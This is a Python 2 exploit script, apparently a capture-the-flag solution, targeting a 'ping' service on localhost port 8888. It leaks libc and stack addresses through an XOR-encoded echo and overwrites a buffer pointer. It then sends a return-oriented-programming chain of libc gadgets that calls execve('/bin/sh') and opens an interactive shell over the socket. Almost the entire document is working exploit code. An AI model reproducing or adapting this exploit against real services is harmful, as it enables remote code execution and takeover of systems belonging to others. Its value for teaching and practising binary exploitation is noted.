import sys
import socket
import struct

def ru(s, u):
  z = ''
  while z.endswith(u) == False:
    z += s.recv(1)
  return z

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 8888))

ru(s, 'ping: ')
s.send('a'*40 + '\n')
y = ru(s, 'ping: ')[6:-8]

z = ''

for i in range( len(y)):
  if i % 2:
    z += chr(ord(y[i]) ^ 0x20)
  else:
    z += y[i]

z += '\x00' * (8-( len(z) %8))

libc_leak = struct.unpack('Q', z[-8:])[0]
libc_leak_offset = 0x3ec760
libc_base = libc_leak - libc_leak_offset

poprdi_ret = 0x503ac + libc_base
poprsi_ret = 0x23e6a + libc_base
poprdx_ret = 0x1306b6 + libc_base

ret = 0x503ad + libc_base
binsh = 0x1b3e9a + libc_base 

### For some reason I was segfaulting when using system so I just switched to execv with a few extra gadgets
system = 0x4f440 + libc_base
exit = 0x43120 + libc_base
execve = 0xe4e30 + libc_base

print '[INFO] libc base: %.8x' %(libc_base) 

s.send('a'*0x98 + '\n')
y = ru(s, 'ping: ')[6:-8]

z = ''

for i in range( len(y)):
  if i % 2:
    z += chr(ord(y[i]) ^ 0x20)
  else:
    z += y[i]

z += '\x00' * (8-( len(z) %8))
stack_leak = struct.unpack('Q', z[-8:])[0]

print '[INFO] stack buffer leak: %.8x' %(stack_leak)

print '[INFO] About to overwrite the buffer address'

#raw_input('....')

byte = chr( (stack_leak & 0xff) - 8 )
s.send('a'*0x98 + byte + '\n')
ru(s, 'ping: ')

print '[INFO] Time to overwrite pc'

pc = struct.pack('Q', poprdi_ret)
pc += struct.pack('Q', binsh)   ### This will point to /bin/sh
pc += struct.pack('Q', poprsi_ret)  ### points to argv, {"/bin/sh", NULL} this will be some stack value
pc += struct.pack('Q', stack_leak+0x40) 
pc += struct.pack('Q', poprdx_ret)
pc += struct.pack('Q', 0)
pc += struct.pack('Q', execve)
pc += struct.pack('Q', exit)
pc += "/bin/sh\x00"
pc += struct.pack('Q', stack_leak+0x38)  ## This will be a pointer to the /bin/sh string
pc += struct.pack('Q', 0) ## NULL pointer
s.send(pc + '\n')

print 'Interactive...'
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
